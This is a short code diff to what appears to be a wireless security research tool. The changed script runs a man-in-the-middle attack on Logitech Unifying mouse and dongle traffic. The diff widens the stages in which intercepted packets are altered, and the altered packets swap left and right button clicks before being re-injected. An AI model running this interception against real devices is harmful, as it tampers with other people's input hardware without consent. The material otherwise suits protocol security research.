@@ -50,7 +50,7 @@ if __name__ == '__main__':
                     pass#print("[mouse]", pkt.metadata, repr(pkt))
             def showd(pkt):
                 global active_stage, queue
-                if active_stage == ManInTheMiddleStage.ACTIVE_MITM:
+                if active_stage != ManInTheMiddleStage.TARGET_CHANNEL_DETECTION:#== ManInTheMiddleStage.ACTIVE_MITM:
                     #print("[dongle]", pkt.metadata, repr(pkt))
                     try:
                         layer = pkt[Logitech_Unifying_Hdr:][1:]
@@ -59,8 +59,8 @@ if __name__ == '__main__':
                                 layer.button_mask = 2
                             elif hasattr(layer, "button_mask") and layer.button_mask == 2:
                                 layer.button_mask = 1
-                            mouse.stack.app.prepare_message(layer)
-                    except:
+                        mouse.stack.app.prepare_message(layer)
+                    except IndexError:
                         pass
             mouse.attach_callback(showm)
             dongle.attach_callback(showd)
